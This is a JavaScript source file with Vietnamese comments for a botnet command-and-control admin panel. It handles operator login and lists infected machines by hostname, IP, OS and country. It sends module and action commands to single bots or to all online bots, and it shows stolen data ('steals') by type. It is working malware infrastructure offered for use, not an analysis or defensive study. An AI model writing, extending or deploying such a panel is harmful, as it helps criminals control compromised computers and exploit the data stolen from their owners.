// =============================================
// C2 Botnet Admin Panel - JavaScript
// =============================================

// Bien toan cuc
let authToken = '';
let wsConnection = null;
let currentBotList = [];
let currentCommandList = [];
let serverBaseURL = '';

// Khoi tao khi trang duoc load
document.addEventListener('DOMContentLoaded', function() {
    // Xac dinh URL server
    serverBaseURL = window.location.origin;
    
    // Kiem tra neu da co token trong localStorage
    const savedToken = localStorage.getItem('c2_auth_token');
    if (savedToken) {
        authToken = savedToken;
        showDashboard();
    }
    
    // Xu ly form dang nhap
    document.getElementById('login-form').addEventListener('submit', handleLogin);
    
    // Xu ly nut dang xuat
    document.getElementById('btn-logout').addEventListener('click', handleLogout);
    
    // Xu ly navigation tabs
    document.querySelectorAll('.nav-item').forEach(item => {
        item.addEventListener('click', function(e) {
            e.preventDefault();
            const tabName = this.getAttribute('data-tab');
            switchTab(tabName);
        });
    });
    
    // Xu ly cac button
    document.getElementById('btn-filter').addEventListener('click', loadBots);
    document.getElementById('btn-send-command').addEventListener('click', sendCommand);
    document.getElementById('btn-filter-steals').addEventListener('click', loadSteals);
    
    // Xu ly terminal
    document.getElementById('terminal-input').addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            executeTerminalCommand();
        }
    });
    
    // Cap nhat dong ho server
    setInterval(updateServerTime, 1000);
    updateServerTime();
});

// Ham dang nhap
function handleLogin(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const errorEl = document.getElementById('login-error');
    
    fetch(serverBaseURL + '/api/login', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            username: username,
            password: password
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            authToken = data.data.token;
            localStorage.setItem('c2_auth_token', authToken);
            showDashboard();
        } else {
            errorEl.textContent = data.message || 'Dang nhap that bai';
            errorEl.style.display = 'block';
        }
    })
    .catch(err => {
        errorEl.textContent = 'Loi ket noi den server: ' + err.message;
        errorEl.style.display = 'block';
    });
}

// Ham dang xuat
function handleLogout() {
    localStorage.removeItem('c2_auth_token');
    authToken = '';
    if (wsConnection) {
        wsConnection.close();
        wsConnection = null;
    }
    document.getElementById('login-page').style.display = 'flex';
    document.getElementById('dashboard').style.display = 'none';
    document.getElementById('username').value = '';
    document.getElementById('password').value = '';
}

// Hien thi dashboard
function showDashboard() {
    document.getElementById('login-page').style.display = 'none';
    document.getElementById('dashboard').style.display = 'flex';
    
    // Khoi tao WebSocket
    initWebSocket();
    
    // Load du lieu ban dau
    switchTab('overview');
    loadStats();
    loadBots();
    loadBotSelect();
    
    // Tu dong refresh
    setInterval(loadStats, 30000); // 30 giay
    setInterval(loadBots, 30000);
}

// Khoi tao WebSocket ket noi
function initWebSocket() {
    if (wsConnection && wsConnection.readyState === WebSocket.OPEN) {
        return;
    }
    
    const wsURL = (window.location.protocol === 'https:' ? 'wss:' : 'ws:') + 
                  '//' + window.location.host + 
                  '/ws/admin?token=' + encodeURIComponent(authToken);
    
    wsConnection = new WebSocket(wsURL);
    
    wsConnection.onopen = function() {
        addLog('info', 'WebSocket da ket noi');
    };
    
    wsConnection.onmessage = function(event) {
        try {
            const msg = JSON.parse(event.data);
            handleWSMessage(msg);
        } catch(e) {
            console.error('Loi parse WS message:', e);
        }
    };
    
    wsConnection.onclose = function() {
        addLog('warning', 'WebSocket bi ngat, thu ket noi lai sau 5 giay...');
        setTimeout(initWebSocket, 5000);
    };
    
    wsConnection.onerror = function(err) {
        console.error('WebSocket error:', err);
    };
}

// Xu ly message tu WebSocket
function handleWSMessage(msg) {
    switch(msg.type) {
        case 'bot_connected':
            addLog('success', 'Bot ' + msg.bot_id + ' da ket noi');
            loadStats();
            loadBots();
            break;
        case 'bot_disconnected':
            addLog('warning', 'Bot ' + msg.bot_id + ' da ngat ket noi');
            loadStats();
            loadBots();
            break;
        case 'command_result':
            addLog('info', 'Bot ' + msg.bot_id + ' hoan thanh lenh: ' + msg.command_id);
            loadCommands();
            break;
        case 'new_steal':
            addLog('success', 'Bot ' + msg.bot_id + ' gui du lieu steal: ' + msg.module);
            loadStats();
            break;
        case 'stats_update':
            updateStatsUI(JSON.parse(msg.result));
            break;
    }
}

// Them log vao khung realtime
function addLog(type, message) {
    const logBox = document.getElementById('realtime-log-box');
    const now = new Date();
    const timeStr = now.toLocaleTimeString('vi-VN');
    
    const entry = document.createElement('div');
    entry.className = 'log-entry';
    entry.innerHTML = '<span class="time">[' + timeStr + ']</span>' +
                      '<span class="type ' + type + '">' + type.toUpperCase() + '</span>' +
                      '<span class="message">' + message + '</span>';
    
    logBox.prepend(entry);
    
    // Gioi han so log hien thi
    const maxLogs = 500;
    while (logBox.children.length > maxLogs) {
        logBox.removeChild(logBox.lastChild);
    }
}

// Chuyen tab
function switchTab(tabName) {
    // Cap nhat navigation
    document.querySelectorAll('.nav-item').forEach(item => {
        item.classList.remove('active');
        if (item.getAttribute('data-tab') === tabName) {
            item.classList.add('active');
        }
    });
    
    // Cap nhat noi dung
    document.querySelectorAll('.tab-content').forEach(content => {
        content.classList.remove('active');
    });
    document.getElementById('tab-' + tabName).classList.add('active');
    
    // Load du lieu cho tab duoc chon
    switch(tabName) {
        case 'overview':
            loadStats();
            break;
        case 'bots':
            loadBots();
            break;
        case 'commands':
            loadCommands();
            break;
        case 'steals':
            loadSteals();
            break;
        case 'terminal':
            break;
    }
}

// API call helper
function apiCall(endpoint, method, body) {
    const headers = {
        'Content-Type': 'application/json'
    };
    
    if (authToken) {
        headers['Authorization'] = 'Bearer ' + authToken;
    }
    
    const options = {
        method: method || 'GET',
        headers: headers
    };
    
    if (body) {
        options.body = JSON.stringify(body);
    }
    
    return fetch(serverBaseURL + endpoint, options)
        .then(response => response.json())
        .catch(err => {
            console.error('API call error:', err);
            return { success: false, message: err.message };
        });
}

// Load thong ke tong quan
function loadStats() {
    apiCall('/api/stats')
        .then(data => {
            if (data.success) {
                updateStatsUI(data.data);
            }
        });
}

// Cap nhat UI thong ke
function updateStatsUI(stats) {
    if (!stats) return;
    
    document.getElementById('stat-total-bots').textContent = stats.total_bots || 0;
    document.getElementById('stat-online-bots').textContent = stats.online_bots || 0;
    document.getElementById('stat-offline-bots').textContent = stats.offline_bots || 0;
    document.getElementById('stat-total-commands').textContent = stats.total_commands || 0;
    document.getElementById('stat-total-steals').textContent = stats.total_steals || 0;
    
    // Cap nhat bieu do quoc gia
    if (stats.countries) {
        const countriesDiv = document.getElementById('chart-countries');
        countriesDiv.innerHTML = '';
        const maxCount = Math.max(...Object.values(stats.countries), 1);
        
        for (const [country, count] of Object.entries(stats.countries)) {
            const percent = (count / maxCount * 100);
            const row = document.createElement('div');
            row.className = 'bar-row';
            row.innerHTML = '<span class="bar-label">' + (country || 'Unknown') + '</span>' +
                           '<div class="bar-track"><div class="bar-fill" style="width:' + percent + '%"></div></div>' +
                           '<span class="bar-count">' + count + '</span>';
            countriesDiv.appendChild(row);
        }
    }
    
    // Cap nhat bieu do OS
    if (stats.os_distribution) {
        const osDiv = document.getElementById('chart-os');
        osDiv.innerHTML = '';
        const maxCount = Math.max(...Object.values(stats.os_distribution), 1);
        
        for (const [os, count] of Object.entries(stats.os_distribution)) {
            const percent = (count / maxCount * 100);
            const row = document.createElement('div');
            row.className = 'bar-row';
            row.innerHTML = '<span class="bar-label">' + os + '</span>' +
                           '<div class="bar-track"><div class="bar-fill" style="width:' + percent + '%"></div></div>' +
                           '<span class="bar-count">' + count + '</span>';
            osDiv.appendChild(row);
        }
    }
}

// Load danh sach bot
function loadBots() {
    const search = document.getElementById('filter-search').value;
    const status = document.getElementById('filter-status').value;
    
    let query = '';
    if (search) query += '&search=' + encodeURIComponent(search);
    if (status) query += '&status=' + encodeURIComponent(status);
    
    apiCall('/api/bots?' + (query ? query.substring(1) : ''))
        .then(data => {
            if (data.success && data.data.bots) {
                currentBotList = data.data.bots;
                renderBotsTable(currentBotList);
            }
        });
}

// Render bang bot
function renderBotsTable(bots) {
    const tbody = document.getElementById('bots-table-body');
    tbody.innerHTML = '';
    
    if (bots.length === 0) {
        tbody.innerHTML = '<tr><td colspan="8" style="text-align:center;padding:20px;">Khong co bot nao</td></tr>';
        return;
    }
    
    bots.forEach(bot => {
        const tr = document.createElement('tr');
        const lastSeen = new Date(bot.last_seen).toLocaleString('vi-VN');
        const statusClass = bot.status === 'online' ? 'status-online' : 'status-offline';
        const statusText = bot.status === 'online' ? 'Online' : 'Offline';
        
        tr.innerHTML = '<td style="font-family:monospace;font-size:11px;">' + bot.id.substring(0, 12) + '...</td>' +
                       '<td>' + bot.hostname + '</td>' +
                       '<td>' + bot.os + '</td>' +
                       '<td>' + bot.ip + '</td>' +
                       '<td>' + (bot.country || 'N/A') + '</td>' +
                       '<td>' + lastSeen + '</td>' +
                       '<td><span class="status-badge ' + statusClass + '">' + statusText + '</span></td>' +
                       '<td>' +
                           '<button class="btn btn-primary btn-sm" onclick="viewBotDetail(\'' + bot.id + '\')">Chi tiet</button> ' +
                           '<button class="btn btn-danger btn-sm" onclick="sendCommandToBot(\'' + bot.id + '\')">Lenh</button>' +
                       '</td>';
        tbody.appendChild(tr);
    });
}

// Xem chi tiet bot
function viewBotDetail(botID) {
    apiCall('/api/bots/' + botID)
        .then(data => {
            if (data.success) {
                alert(JSON.stringify(data.data, null, 2));
            }
        });
}

// Gui lenh den bot
function sendCommandToBot(botID) {
    document.getElementById('cmd-bot-select').value = botID;
    switchTab('commands');
}

// Load danh sach bot cho select
function loadBotSelect() {
    apiCall('/api/bots?status=online&limit=200')
        .then(data => {
            if (data.success && data.data.bots) {
                const select = document.getElementById('cmd-bot-select');
                // Giu option "all"
                select.innerHTML = '<option value="all">Tat ca Bot Online</option>';
                data.data.bots.forEach(bot => {
                    const option = document.createElement('option');
                    option.value = bot.id;
                    option.textContent = bot.hostname + ' (' + bot.ip + ')';
                    select.appendChild(option);
                });
            }
        });
}

// Gui lenh
function sendCommand() {
    const botID = document.getElementById('cmd-bot-select').value;
    const module = document.getElementById('cmd-module').value;
    const action = document.getElementById('cmd-action').value;
    const params = document.getElementById('cmd-params').value;
    
    apiCall('/api/command', 'POST', {
        bot_id: botID,
        module: module,
        action: action,
        params: params
    })
    .then(data => {
        if (data.success) {
            addLog('success', 'Da gui lenh ' + action + ' den ' + 
                   (botID === 'all' ? 'tat ca bot' : botID));
            document.getElementById('cmd-params').value = '';
            loadCommands();
        } else {
            addLog('error', 'Loi gui lenh: ' + data.message);
        }
    });
}

// Load lich su lenh
function loadCommands() {
    apiCall('/api/commands?limit=200')
        .then(data => {
            if (data.success && data.data.commands) {
                currentCommandList = data.data.commands;
                renderCommandsTable(currentCommandList);
            }
        });
}

// Render bang lenh
function renderCommandsTable(commands) {
    const tbody = document.getElementById('commands-table-body');
    tbody.innerHTML = '';
    
    if (commands.length === 0) {
        tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:20px;">Khong co lenh nao</td></tr>';
        return;
    }
    
    commands.forEach(cmd => {
        const tr = document.createElement('tr');
        const createdAt = new Date(cmd.created_at).toLocaleString('vi-VN');
        let statusClass = 'status-pending';
        let statusText = 'Dang cho';
        
        switch(cmd.status) {
            case 'executing':
                statusClass = 'status-pending';
                statusText = 'Dang thuc thi';
                break;
            case 'completed':
                statusClass = 'status-completed';
                statusText = 'Hoan thanh';
                break;
            case 'failed':
                statusClass = 'status-failed';
                statusText = 'That bai';
                break;
        }
        
        tr.innerHTML = '<td style="font-family:monospace;font-size:11px;">' + cmd.id.substring(0, 10) + '...</td>' +
                       '<td>' + cmd.bot_id.substring(0, 10) + '...</td>' +
                       '<td>' + cmd.module + '</td>' +
                       '<td>' + cmd.action + '</td>' +
                       '<td><span class="status-badge ' + statusClass + '">' + statusText + '</span></td>' +
                       '<td>' + createdAt + '</td>';
        tbody.appendChild(tr);
    });
}

// Load du lieu steal
function loadSteals() {
    const dataType = document.getElementById('steal-filter-type').value;
    let query = '';
    if (dataType) query += '&data_type=' + encodeURIComponent(dataType);
    
    apiCall('/api/steals?limit=50' + query)
        .then(data => {
            if (data.success && data.data.steals) {
                renderSteals(data.data.steals);
            }
        });
}

// Render du lieu steal
function renderSteals(steals) {
    const container = document.getElementById('steals-data-container');
    container.innerHTML = '';
    
    if (steals.length === 0) {
        container.innerHTML = '<p style="text-align:center;padding:40px;">Khong co du lieu steal nao</p>';
        return;
    }
    
    steals.forEach(steal => {
        const card = document.createElement('div');
        card.className = 'data-card';
        
        let dataPreview = '';
        try {
            const parsed = JSON.parse(steal.data);
            dataPreview = JSON.stringify(parsed, null, 2);
        } catch(e) {
            dataPreview = steal.data.substring(0, 500);
        }
        
        if (dataPreview.length > 500) {
            dataPreview = dataPreview.substring(0, 500) + '...';
        }
        
        const timestamp = new Date(steal.timestamp).toLocaleString('vi-VN');
        
        card.innerHTML = '<h4>' + steal.data_type.toUpperCase() + ' - ' + steal.bot_id.substring(0, 8) + '...</h4>' +
                         '<p style="font-size:11px;color:var(--text-muted);margin-bottom:5px;">' + timestamp + '</p>' +
                         '<pre>' + escapeHtml(dataPreview) + '</pre>';
        container.appendChild(card);
    });
}

// Escape HTML de tranh XSS
function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, function(m) { return map[m]; });
}

// Xu ly terminal
function executeTerminalCommand() {
    const input = document.getElementById('terminal-input');
    const command = input.value.trim();
    const output = document.getElementById('terminal-output');
    
    if (!command) return;
    
    // Hien thi lenh da nhap
    output.innerHTML += '<div class="cmd-line">admin@c2:~$ ' + escapeHtml(command) + '</div>';
    
    // Xu ly lenh don gian
    const parts = command.split(' ');
    const cmd = parts[0].toLowerCase();
    
    switch(cmd) {
        case 'help':
            output.innerHTML += '<div class="cmd-output">Cac lenh co ban:<br>' +
                               '  stats - Xem thong ke<br>' +
                               '  bots - Xem danh sach bot online<br>' +
                               '  clear - Xoa man hinh terminal<br>' +
                               '  help - Hien thi tro giup nay</div>';
            break;
        case 'stats':
            loadStats();
            output.innerHTML += '<div class="cmd-output">Dang tai thong ke...</div>';
            break;
        case 'bots':
            loadBots();
            output.innerHTML += '<div class="cmd-output">Dang tai danh sach bot...</div>';
            break;
        case 'clear':
            output.innerHTML = '';
            break;
        default:
            output.innerHTML += '<div class="cmd-error">Lenh khong duoc nhan dien: ' + escapeHtml(cmd) + '</div>';
    }
    
    input.value = '';
    
    // Tu dong scroll xuong cuoi
    output.scrollTop = output.scrollHeight;
}

// Cap nhat dong ho
function updateServerTime() {
    const now = new Date();
    const timeStr = now.toLocaleTimeString('vi-VN');
    const dateStr = now.toLocaleDateString('vi-VN');
    const timeEl = document.getElementById('server-time');
    if (timeEl) {
        timeEl.textContent = dateStr + ' ' + timeStr;
    }
}